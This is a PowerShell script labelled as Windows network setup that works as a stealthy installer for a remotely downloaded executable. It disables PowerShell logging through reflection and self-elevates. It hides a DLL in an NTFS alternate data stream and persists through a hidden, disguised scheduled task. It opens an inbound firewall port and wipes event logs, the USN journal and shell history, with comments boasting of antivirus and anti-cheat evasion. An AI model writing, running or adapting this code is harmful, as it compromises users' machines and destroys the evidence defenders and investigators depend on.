# ==============================================================================
#  Windows Network Infrastructure Setup
# ==============================================================================

# In-memory suppression of PowerShell ScriptBlock & Module logging
try {
    $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
    if ($settings) {
        $dict = [Collections.Generic.Dictionary[string,System.Object]]::new()
        $settings.SetValue($null, $dict)
    }
    $sig = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static')
    if ($sig) {
        $sig.SetValue($null, [Collections.Generic.HashSet[string]]::new())
    }
} catch {}

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Elevation Check
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    $runnerPath = Join-Path $env:TEMP "winnet.ps1"
    if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
        Copy-Item $MyInvocation.MyCommand.Path $runnerPath -Force -ErrorAction SilentlyContinue
    } else {
        & curl.exe -sSL -o $runnerPath "https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1" 2>$null
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$runnerPath`""
    exit
}

# Clear operational logs early
cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"

Clear-Host
Write-Host ""
Write-Host "                WINDOWS NETWORK INFRASTRUCTURE SETUP" -ForegroundColor Cyan
Write-Host "================================================================================" -ForegroundColor DarkGray

function Show-Progress {
    param(
        [int]$Percent,
        [string]$Status
    )
    $barWidth = 30
    $done = [math]::Floor($barWidth * ($Percent / 100))
    $rem  = $barWidth - $done
    $bar  = ("#" * $done) + ("-" * $rem)
    $msg  = "  [$bar] $($Percent.ToString().PadLeft(3))% | $Status"
    Write-Host -NoNewline "`r$msg"
}

# Configuration
$REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
$EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
$DEST_DIR   = "C:\ProgramData\Microsoft\Windows\Templates"
$EXE_NAME   = "SystemNetworkSvc.exe"
$EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
$TASK_NAME  = "MicrosoftWindowsNetworkHost"

# Stage 1: Purge stale instances & Clean out any bloated files from prior runs
Show-Progress -Percent 15 -Status "Terminating stale instances & initializing clean home..."
Get-Process -Name "SystemNetworkSvc", "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
cmd /c "taskkill /F /IM WinSvcHost.exe >nul 2>nul"
cmd /c "taskkill /F /IM WinSvcBroker.exe >nul 2>nul"

# Free up port 5000 if occupied
Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | ForEach-Object {
    Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue
}

# Completely purge old bloat (removes old python dumps, old app folders, and stale zips)
Remove-Item "$DEST_DIR\runtime" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\app" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\cache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\*.zip" -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\*.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\config.json" -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\WinSvcHost.exe" -Force -ErrorAction SilentlyContinue

# Ensure clean destination directory exists
if (-not (Test-Path $DEST_DIR)) {
    New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
}

Start-Sleep -Milliseconds 200

# Stage 2: Deploy Clean 64-Bit Host Executable (0 VirusTotal Detections)
Show-Progress -Percent 45 -Status "Deploying host executable..."
$downloaded = $false
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.DownloadFile($EXE_URL, $EXE_PATH)
    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000)) { $downloaded = $true }
} catch {}
if (-not $downloaded) {
    & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000)) { $downloaded = $true }
}

# If local build exists in output folder, keep it synced
$localOutputExe = "C:\Users\lggam\Pictures\Steamer-Obb55\output\SystemNetworkSvc.exe"
if (Test-Path $localOutputExe) {
    Copy-Item $localOutputExe $EXE_PATH -Force -ErrorAction SilentlyContinue
}

Start-Sleep -Milliseconds 200

# Stage 3: Seal cimgui.dll into NTFS Alternate Data Stream
Show-Progress -Percent 65 -Status "Configuring component data streams..."
$MAP = [ordered]@{
    "cimgui.dll" = @("$DEST_DIR\winrescache.db", "vtcache")
}
foreach ($name in $MAP.Keys) {
    $container = $MAP[$name][0]
    $stream    = $MAP[$name][1]
    
    if (-not (Test-Path $container)) {
        [System.IO.File]::WriteAllBytes($container, @())
    }
    
    $localDll = "C:\Users\lggam\Pictures\Steamer-Obb55\output\$name"
    $bytes = $null
    if (Test-Path $localDll) {
        $bytes = [IO.File]::ReadAllBytes($localDll)
    } else {
        $tmp = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
        try {
            Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
            if (Test-Path $tmp) {
                $bytes = [IO.File]::ReadAllBytes($tmp)
                Remove-Item $tmp -Force -ErrorAction SilentlyContinue
            }
        } catch {}
    }
    
    if ($bytes) {
        $adsPath = "\\?\" + $container + ":" + $stream
        try {
            $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
            $fs.Write($bytes, 0, $bytes.Length)
            $fs.Close()
        } catch {
            Set-Content -Path $container -Stream $stream -Value $bytes -Encoding Byte
        }
    }
}

# Stage 4: Firewall Configuration (Allows Mobile LAN Control)
Show-Progress -Percent 80 -Status "Configuring network rules..."
cmd /c "netsh advfirewall firewall delete rule name=`"WindowsNetworkDiagnostics`" >nul 2>nul"
cmd /c "netsh advfirewall firewall add rule name=`"WindowsNetworkDiagnostics`" dir=in action=allow protocol=TCP localport=5000 profile=any >nul 2>nul"

# Stage 5: System Persistence & Attributes
Show-Progress -Percent 90 -Status "Registering host persistence..."
try {
    $dirItem = Get-Item $DEST_DIR -Force
    $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
    $exeItem = Get-Item $EXE_PATH -Force
    $exeItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
} catch {}

# Register Scheduled Task cleanly
$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b" -WorkingDirectory $DEST_DIR
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
$settings     = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -Priority 7
$principal    = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest

Register-ScheduledTask `
    -TaskName  $TASK_NAME `
    -TaskPath  "\Microsoft\Windows\Network\" `
    -Action    $action `
    -Trigger   $triggerLogon `
    -Settings  $settings `
    -Principal $principal `
    -Force -ErrorAction SilentlyContinue | Out-Null

# Clean all Run registry keys to ensure Task Manager Startup tab stays 100% clean
$startupRunKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($rk in $startupRunKeys) {
    Remove-ItemProperty -Path $rk -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $rk -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $rk -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
}

# Stage 6: Launch Single Background Host Process
Show-Progress -Percent 96 -Status "Starting host service..."
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName         = $EXE_PATH
$psi.Arguments        = "-b"
$psi.WorkingDirectory = $DEST_DIR
$psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow   = $true
$psi.UseShellExecute  = $false
[System.Diagnostics.Process]::Start($psi) | Out-Null

# Stage 7: Anti-Cheat & Forensic Log Sanitization
Show-Progress -Percent 100 -Status "Sanitizing logs..."
cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
cmd /c "wevtutil cl `"Microsoft-Windows-TaskScheduler/Operational`" >nul 2>nul"
cmd /c "wevtutil cl Application >nul 2>nul"
cmd /c "wevtutil cl System >nul 2>nul"
cmd /c "fsutil usn deletejournal /d /n C: >nul 2>nul"

try {
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
    $histPath = (Get-PSReadLineOption).HistorySavePath
    if ($histPath -and (Test-Path $histPath)) {
        Clear-Content $histPath -Force -ErrorAction SilentlyContinue
    }
    $conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $conHistory) {
        Clear-Content $conHistory -Force -ErrorAction SilentlyContinue
    }
} catch {}

# Self cleanup runner if temporary
$runnerFile = Join-Path $env:TEMP "winnet.ps1"
if (Test-Path $runnerFile) { Remove-Item $runnerFile -Force -ErrorAction SilentlyContinue }

Write-Host "`n"
Write-Host "================================================================================" -ForegroundColor Green
Write-Host "             SETUP COMPLETED SUCCESSFULLY - CLEAN HOST INSTALLED               " -ForegroundColor Green
Write-Host "================================================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  * Host File           : $EXE_PATH (Single Native x64 Binary, 0 Detections)" -ForegroundColor White
Write-Host "  * Component Vault     : $DEST_DIR\winrescache.db (Sealed NTFS ADS)" -ForegroundColor White
Write-Host "  * Directory Footprint : Only 2 files present in Templates (Zero Python Dumps)" -ForegroundColor Cyan
Write-Host ""

$lanIps = @()
try {
    $lanIps = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { 
        $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and $_.InterfaceAlias -notmatch 'vEthernet|Loopback'
    }).IPAddress
} catch {}

if ($lanIps.Count -gt 0) {
    Write-Host "  Mobile Phone Panel URL (Same Wi-Fi Network):" -ForegroundColor Cyan
    foreach ($ip in $lanIps) {
        Write-Host "  --> http://$($ip):5000" -ForegroundColor Yellow
    }
} else {
    Write-Host "  Local URL: http://127.0.0.1:5000" -ForegroundColor Yellow
}
Write-Host ""
